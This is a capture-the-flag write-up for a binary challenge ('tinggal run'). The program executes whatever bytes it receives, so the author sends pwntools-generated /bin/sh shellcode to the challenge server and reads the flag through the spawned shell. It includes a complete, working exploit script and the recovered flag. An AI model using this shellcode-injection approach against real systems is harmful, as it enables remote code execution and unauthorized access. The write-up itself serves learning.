# tinggal run
> asli serius tinggal run aja

Author: vannn


## About the Challenge
This challenge gives a chall elf

## How to Solve?

First, we disassembly the call using the command. 

```
objdump -d chall > chall.asm 
```

From disassembly: the program reads up to 0x100 bytes into a buffer on the stack and then calls that buffer as a function (call *%rdx). This allows us to send machine code (shellcode) to be executed. So I created a position-independent shellcode (using pwntools shellcraft), sent those bytes over a socket to the service, and then ran a command like cat flag.txt through the spawned shell. and this is my exploit.py

```
#!/usr/bin/env python3
from pwn import *

HOST, PORT = 'intersec.hcs-team.com', 10095
context.update(arch='amd64')
sc = asm(shellcraft.sh())

io = remote(HOST, PORT)
io.send(sc)
for cmd in [b'cat flag', b'cat flag.txt']:
    io.sendline(cmd)
    try:
        print(io.recv(timeout=2).decode(errors='ignore'))
    except EOFError:
        break
io.close()

```
then just run it and

<img width="786" height="574" alt="Screenshot from 2025-09-17 22-44-48" src="https://github.com/user-attachments/assets/81939d9e-c100-40a4-88ac-f5ff1231615b" />


Boom. we got the flag

## Flag
```
HCS{sh3llc0de_us1ng_sh3llcraft_4nd_sh3llstorm_db5964f1-137c-4e6e-9590-6d70da055b6a}

```
